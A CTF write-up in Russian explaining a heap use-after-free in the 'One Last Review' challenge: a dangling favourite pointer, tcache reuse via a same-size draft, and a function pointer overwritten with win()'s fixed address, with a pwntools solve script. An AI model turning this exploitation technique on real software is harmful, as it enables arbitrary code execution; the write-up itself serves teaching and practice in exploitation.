# One Last Review - разбор (heap UAF, переиспользование tcache, косвенный вызов на win)

## Знакомство с задачей

В архиве два файла:

- `chall.c` - полный исходник программы на C
- `chall` - скомпилированный бинарник (ELF64, не PIE, без strip)

Программа - интерактивное консольное меню «оставь отзыв» на 6 опций:

```text
1. Submit a review
2. Mark review as favourite
3. Delete review
4. Write a draft
5. Preview favourite review
6. Leave
```

## Почему цель - `win()` (и как я её нашёл)

Исходник лежит в архиве, поэтому первый шаг - прочитать его и найти, где вообще может печататься флаг. В `chall.c` есть ровно одно место, которое открывает `flag.txt`, - функция `win()`:

```c
__attribute__((used, noinline))
void win(review_t *unused)
{
    char flag[256];
    FILE *file;

    file = fopen("flag.txt", "r");
    if (file == NULL) { puts("The prize envelope is missing..."); exit(1); }
    ...
    printf("Five stars! Here is your prize:\n%s", flag);
    exit(0);
}
```

Она читает `flag.txt` и печатает его. Больше ничто в программе не трогает `flag.txt`. Отсюда и цель: единственный способ получить флаг - заставить программу выполнить `win()`.

`win()` есть в коде и помечена `__attribute__((used, noinline))`, чтобы компилятор её не выпилил. Но из меню она никак не вызывается - значит, надо перехватить какой-нибудь косвенный вызов и перенаправить его на `win`.

## Почему структура отзыва - ключевая

Читаю дальше, интересный тип - отзыв:

```c
#define REVIEW_TEXT_SIZE 32

struct review {
    char text[REVIEW_TEXT_SIZE];   // offset 0x00, 32 байта
    void (*display)(review_t *review);  // offset 0x20, указатель на функцию
};
```

В памяти отзыв занимает 40 байт: 32 байта текста + 8 байт указателя на функцию.

Почему эта структура - ключ к флагу: в ней лежит **указатель на функцию** (`display`), и меню вызывает его косвенно (`preview_favourite` - через поле `display`). Указатель на функцию - это значение, на которое программа потом перепрыгивает. Если заменить это значение на адрес `win`, в следующий раз, когда меню вызовет `display`, оно выполнит `win` - и напечатает флаг. Эта структура даёт точный ответ на вопрос «что перезаписывать».

## Что такое чанк (простое определение)

**Чанк** - это кусок памяти, который возвращает `malloc`. Когда программа вызывает `malloc(40)`, аллокатор вырезает из кучи чанк: небольшой заголовок (размер, флаги) плюс 40 байт данных, которые реально использует программа. Когда программа вызывает `free(ptr)`, чанк возвращается аллокатору: его данные могут переиспользоваться для служебных целей (например, освобождённый чанк кладётся в корзину-список tcache), но сама память остаётся в куче.

Практическое правило для этой задачи: `malloc(40)` и `free(ptr)` работают с целыми чанками, и освобождённый чанк данного размера переиспользуется ближайшим `malloc` того же размера. `draft_t` имеет ровно `sizeof(review_t)` (40 байт), поэтому freed-чанк отзыва и новый чанк черновика - это один и тот же чанк.

## Баг: delete_review оставляет висячий указатель

Смотрю на функцию удаления:

```c
static void delete_review(void)
{
    if (review == NULL) { puts("There is no review to delete."); return; }

    free(review);
    review = NULL;
    puts("Review deleted.");
}
```

Чанк освобождается, `review` обнуляется - но глобальный указатель `favourite` тут **не трогается**. Если отзыв был помечен как избранный, `favourite` продолжает указывать на освобождённый чанк.

Это **use-after-free (UAF)**: указатель, который продолжает ссылаться на память после её освобождения. Это известный класс уязвимостей (CWE-416 "Use After Free", см. https://cwe.mitre.org/data/definitions/416.html): освобождённая память может быть перераспределена и заполнена данными атакующего, и любое последующее использование через устаревший указатель работает уже с этими данными. «Классический» здесь - стандартный сценарий из этого описания CWE: освободи объект, сохрани указатель, переиспользуй память, сработай устаревший указатель.

## Путь к использованию: write_draft переиспользует чанк

`write_draft` показывает, как воспользоваться висячим указателем:

```c
static void write_draft(void)
{
    long length;
    ...
    printf("Draft length (1-%zu): ", sizeof(draft->contents));
    length = read_number();
    if (length < 1 || (size_t)length > sizeof(draft->contents)) { ... }

    draft = malloc(sizeof(*draft));   // sizeof(draft_t) == sizeof(review_t) == 40
    ...
    memset(draft->contents, 0, sizeof(draft->contents));
    printf("Send exactly %ld draft bytes: ", length);
    read_exact(draft->contents, (size_t)length);
    ...
}
```

Черновик - это структура `draft_t`, размер которой равен размеру `review_t` (40 байт), и она целиком состоит из контролируемых нами данных (буфер `contents`). Мы сами выбираем `length` от 1 до 40, то есть можем записать **любые 40 байт**.

А функция просмотра избранного - триггер:

```c
static void preview_favourite(void)
{
    if (favourite == NULL) { ... }

    favourite->display(favourite);   // косвенный вызов по указателю
}
```

Она вызывает поле `display` структуры, на которую указывает `favourite`.

## План атаки (по шагам: как каждый шаг приближает к флагу)

1. **`submit_review` - создаём объект, которым потом будем управлять.** Он выделяет на куче чанк 40 байт, заполняет `text`, ставит `display = show_review`. Зачем этот шаг: это чанк, чьим временем жизни мы будем злоупотреблять; без реального отзыва дальше ничего не работает (меню отказывается удалять пустой отзыв).

2. **`mark_favourite` - сохраняем второй указатель на тот же объект.** `favourite = review`. Зачем: теперь два глобала указывают на один чанк. После освобождения `review` обнулится, а `favourite` - нет; `favourite` и будет тем устаревшим указателем, который мы сработаем позже.

3. **`delete_review` - освобождаем чанк, оставляем устаревший указатель.** `free(review)`, `review = NULL`. Зачем: чанк попадает в tcache (корзину освобождённых чанков размера 40), и главное - `favourite` всё ещё указывает на него. Теперь у нас примитив UAF: живой указатель на освобождённую память.

4. **`write_draft` - перевыделяем тот же чанк.** `malloc(40)` возвращает ровно freed-чанк из шага 3 (тот же размер, tcache отдаёт его первым). Зачем: `draft` теперь алиасит память, на которую указывает `favourite`, - что мы запишем в черновик, то `favourite` и «увидит».

5. **`read_exact` - записываем туда наш payload.** Шлём 32 байта мусора + `p64(addr_of_win)` (40 байт ложатся со смещения 0x20, это поле `display`). Зачем: это и есть сама перезапись - мы только что заменили указатель на функцию. Структура теперь выглядит как отзыв, у которого `display` = `win`.

6. **`preview_favourite` - срабатываем угнанный косвенный вызов.** Он выполняет `favourite->display(favourite)`, а `display` теперь - адрес `win` (не `show_review`). Зачем: это момент, когда программа прыгает в `win`, которая открывает `flag.txt` и печатает его. Флаг появляется в выводе соединения.

## Почему адрес win - фиксированная константа (PIE vs EXEC)

- **PIE** (Position Independent Executable): бинарь грузится по случайному базовому адресу при каждом запуске (ASLR), поэтому адреса функций каждый раз меняются; чтобы вызвать функцию, сначала нужен лик базы.
- **EXEC** (тип, который показывает `readelf -h` для non-PIE ELF): у бинаря фиксированный адрес загрузки, поэтому адрес каждой функции - константа.

Наш `chall` - тип EXEC (не PIE), поэтому адрес `win` статический. Беру его из таблицы символов:

```bash
$ nm chall | grep win
000000000040135f T win
```

## Эксплойт (scripts/solve.py)

```python
WIN = 0x40135F  # win() - статический адрес, бинарь non-PIE
...
def run_exploit(r):
    payload = b"A" * 32 + p64(WIN)  # text[32] + display = win

    r.sendlineafter(b"> ", b"1")                          # submit a review
    r.sendlineafter(b"Review: ", b"Hello")                # текст отзыва
    r.sendlineafter(b"> ", b"2")                          # mark favourite: favourite = review
    r.sendlineafter(b"> ", b"3")                          # delete review: free(review), favourite висит
    r.sendlineafter(b"> ", b"4")                          # write draft: malloc(40) переиспользует freed-чанк
    r.sendlineafter(b"Draft length (1-40): ", b"40")
    r.sendafter(b"Send exactly 40 draft bytes: ", payload)
    r.sendlineafter(b"> ", b"5")                          # preview favourite: вызывает display() = win()

    r.recvuntil(b"Five stars! Here is your prize:\n")
    return r.recvline().decode(errors="replace").strip()
```

Небольшие нюансы:

- На инстансе соединение обёрнуто в TLS (`ncat --ssl`), поэтому в pwntools обязателен `ssl=True` - без него соединение рвётся сразу.
- Длину черновика отправляем `sendlineafter` (в меню её читает `strtol` по строке), а сами 40 байт - `sendafter`: `read_exact` читает ровно 40 байт, и лишний перевод строки остался бы в буфере и вызвал безобидный `Invalid choice.` перед пунктом 5.
- `payload` содержит нулевые байты (`p64(0x40135f)`), поэтому отправлять его надо байтами, а не «строкой».

## Тупики (что я рассматривал и отверг)

1. **Перезапись GOT.** Не нужна и не проще: косвенный вызов в `preview_favourite` - это прямой вызов по указателю на структуру, которую мы полностью контролируем - GOT не участвует.
2. **Переполнение стека / формат-строка.** В исходнике их нет; единственный косвенный вызов - `display` у отзыва.
3. **Сначала ликнуть libc.** Не нужно: `win` находится в самом бинаре по фиксированному адресу, а бинарь не PIE. База libc не требуется.

## Версия в один абзац

One Last Review - baby-heap. Исходник показывает, что флаг печатает только `win()`, которую из меню никто не вызывает. Структура отзыва (40 байт) заканчивается указателем на функцию `display`, и `preview_favourite` вызывает его косвенно. `delete_review` освобождает чанк отзыва, но оставляет глобальный `favourite` указывающим на него (UAF, CWE-416). `write_draft` выделяет тот же размер 40, tcache переиспользует освобождённый чанк, и мы заполняем его 32 байтами мусора плюс статическим адресом `win` (0x40135f, бинарь типа EXEC, не PIE). Следующий `preview_favourite` вызывает `display`, который теперь равен `win`, - и флаг напечатан.

## Уроки

1. Освобождённый объект с живым указателем-алиасом (UAF) полезен только если можно заново заполнить освобождённый чанк контролируемыми данными того же размера.
2. Указатели на функции в структурах - самая прямая цель для перехвата: подмени указатель, и любой последующий косвенный вызов через него станет произвольным исполнением кода.
3. Non-PIE бинарь (тип EXEC) делает «win» фиксированной константой - лик не нужен, просто `nm` и упакуй адрес.
4. Читай исходник ради размеров аллокаций: `draft_t` того же размера, что `review_t`, - это ровно то, что превращает «освобождённый чанк» в «переиспользованный чанк».
